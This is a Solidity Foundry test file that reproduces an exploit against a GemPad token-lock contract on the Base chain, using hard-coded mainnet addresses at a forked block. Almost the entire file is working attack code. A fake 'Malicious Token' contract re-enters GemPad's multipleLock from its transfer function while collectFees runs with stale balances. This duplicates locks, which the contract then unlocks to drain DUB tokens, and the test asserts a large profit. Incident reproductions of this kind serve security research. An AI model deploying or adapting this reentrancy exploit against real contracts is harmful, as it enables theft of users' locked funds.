// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IGemPadLock {
    function multipleLock(
        address[] calldata owners,
        address token,
        bool isLpToken,
        uint256[] calldata amounts,
        uint40 unlockDate,
        string calldata description,
        string calldata metaData,
        address projectToken,
        address referrer
    ) external payable returns (uint256[] memory);

    function lockLpV3(
        address owner,
        address nftManager,
        uint256 nftId,
        uint40 unlockDate,
        string calldata description,
        string calldata metaData,
        address projectToken,
        address referrer
    ) external payable returns (uint256 id);

    function collectFees(
        uint256 lockId
    ) external returns (uint256 amount0, uint256 amount1);

    function unlock(
        uint256 lockId
    ) external;
}

interface IERC721Approve {
    function approve(
        address to,
        uint256 tokenId
    ) external;
}

interface IBaseSwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

contract GemPadAttacker {
    INonfungiblePositionManager private constant POSITION_MANAGER =
        INonfungiblePositionManager(0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1);
    IBaseSwapRouter private constant ROUTER = IBaseSwapRouter(0x2626664c2603336E57B271c5C0b26F421741e481);
    IGemPadLock private constant GEMPAD = IGemPadLock(0x10B5F02956d242aB770605D59B7D27E51E45774C);
    IERC20 private constant DUB = IERC20(0x30457a1ab7cd796d6E55E4e5BA12e09f2283e856);

    string public constant name = "Malicious Token";
    string public constant symbol = "EXP";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 10_000 ether;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256[] private duplicatedLocks;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        balanceOf[address(this)] = totalSupply;
    }

    function exploit() external {
        uint256 seed = DUB.balanceOf(address(this));
        uint256 nftId = _createPosition(seed / 1_000_000);

        IERC721Approve(address(POSITION_MANAGER)).approve(address(GEMPAD), nftId);
        uint256 lockId = GEMPAD.lockLpV3(
            address(this),
            address(POSITION_MANAGER),
            nftId,
            uint40(block.timestamp + 1),
            "",
            "",
            address(this),
            address(0)
        );

        allowance[address(this)][address(ROUTER)] = type(uint256).max;
        DUB.approve(address(GEMPAD), type(uint256).max);

        IBaseSwapRouter.ExactInputSingleParams memory params = IBaseSwapRouter.ExactInputSingleParams({
            tokenIn: address(this),
            tokenOut: address(DUB),
            fee: 500,
            recipient: address(this),
            amountIn: 1_000_000_000,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

        uint256 iterations = DUB.balanceOf(address(GEMPAD)) / DUB.balanceOf(address(this));
        for (uint256 i; i < iterations; ++i) {
            ROUTER.exactInputSingle(params);
            GEMPAD.collectFees(lockId);
        }
    }

    function unlockDuplicatedLocks() external {
        for (uint256 i; i < duplicatedLocks.length; ++i) {
            GEMPAD.unlock(duplicatedLocks[i]);
        }
    }

    function _createPosition(
        uint256 dubAmount
    ) private returns (uint256 tokenId) {
        DUB.approve(address(POSITION_MANAGER), type(uint256).max);
        allowance[address(this)][address(POSITION_MANAGER)] = type(uint256).max;

        POSITION_MANAGER.createAndInitializePoolIfNecessary(address(DUB), address(this), 500, type(uint96).max);

        INonfungiblePositionManager.MintParams memory params = INonfungiblePositionManager.MintParams({
            token0: address(DUB),
            token1: address(this),
            fee: 500,
            tickLower: -100_000,
            tickUpper: 100_000,
            amount0Desired: dubAmount,
            amount1Desired: dubAmount,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp + 1
        });
        (tokenId,,,) = POSITION_MANAGER.mint(params);
    }

    function transfer(
        address to,
        uint256 amount
    ) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;

        // collectFees transfers the malicious token after reading DUB's
        // balance. Reentering here creates a DUB lock while GemPad's balance
        // accounting is stale, so the same DUB is returned and locked again.
        if (to == address(GEMPAD) && amount == 499_999) {
            address[] memory owners = new address[](1);
            owners[0] = address(this);

            uint256[] memory amounts = new uint256[](1);
            amounts[0] = DUB.balanceOf(address(this));

            uint256[] memory ids = GEMPAD.multipleLock(
                owners, address(DUB), false, amounts, uint40(block.timestamp + 1), "", "", address(DUB), address(0)
            );
            duplicatedLocks.push(ids[0]);
        }

        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(
        address spender,
        uint256 amount
    ) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract GemPadExploitTest is Test {
    IERC20 private constant DUB = IERC20(0x30457a1ab7cd796d6E55E4e5BA12e09f2283e856);

    function testExploit() public {
        vm.createSelectFork("https://mainnet.base.org", 23_814_680);

        GemPadAttacker attacker = new GemPadAttacker();
        uint256 seed = 22_126_859_807_371_300_580_304_730;
        deal(address(DUB), address(attacker), seed);

        attacker.exploit();
        vm.warp(block.timestamp + 2);
        attacker.unlockDuplicatedLocks();

        assertGt(DUB.balanceOf(address(attacker)), seed + 900_000_000 ether);
    }
}
